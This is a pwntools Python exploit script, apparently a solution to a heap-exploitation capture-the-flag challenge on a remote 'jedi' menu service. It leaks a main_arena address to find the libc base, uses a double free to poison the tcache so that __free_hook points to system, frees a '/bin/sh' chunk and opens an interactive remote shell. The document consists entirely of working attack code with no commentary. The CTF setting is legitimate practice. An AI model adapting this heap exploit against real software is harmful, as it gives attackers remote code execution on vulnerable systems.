from pwn import *

#context.log_level = 'DEBUG'

def malloc(index, size, data):
	#p.recv()
	p.sendline(b'1')
	p.recv()
	p.sendline(str(index).encode())
	p.recv()
	p.sendline(str(size).encode())
	p.recv()
	p.sendline(data)
	p.recv()


def show(index):
	#p.recv()
	p.sendline(b'2')
	p.recvuntil(b'enter jedi number to cancel: ')
	p.sendline(str(index).encode())
	p.recv()


def free(index):
	#p.recv()
	p.sendline(b'3')
	p.recv()
	p.sendline(str(index).encode())
	p.recv()


p = remote("warzone.hackrocks.com", 7771)
p.recv() # remote
malloc(0, 0x500, b'a'*0x500)
malloc(1, 0x60, b'b'*0x60)


free(1)
free(0)

p.sendline(b'2')
p.recvuntil(b':')
p.sendline(b'0') #index 0

leak = p.recvuntil(b'JEDI')
#print(leak)
leak = leak.replace(b'\nJEDI', b' ')
leak = leak.split(b' ') #  [b'enter', b'jedi', b'number:', b'\njedi', b'data:', b'\xe0[\xd7\xac\t\x7f', b'']
#print(leak)

addr = u64(leak[5] + b'\x00\x00')


malloc_hook = addr - 0x70
libc = malloc_hook - 0x1ebb70
free_hook = libc + 0x1eeb28
system = libc + 0x55410

log.success("leaked main arena: " + hex(addr))
log.success("malloc_hook: "+hex(malloc_hook))
log.success("libc base: "+hex(libc))
log.success("free hook: "+hex(free_hook))
log.success("system: "+hex(system))


for x in range(0, 9):
	malloc(x, 1, str(chr(ord('a') + x)).encode())

for x in range(0, 7):
	free(x)

free(7)
free(8)
free(7)

for x in range(0, 7):
	malloc(x, 1, str(chr(ord('a') + x)).encode())

malloc(7, len(p64(free_hook)), p64(free_hook))
malloc(8, len(b'YEET'), b'YEET')
malloc(9, len(b'/bin/sh\x00'), b'/bin/sh\x00')
malloc(8, len(p64(system)) , p64(system))

free(7)
p.interactive()


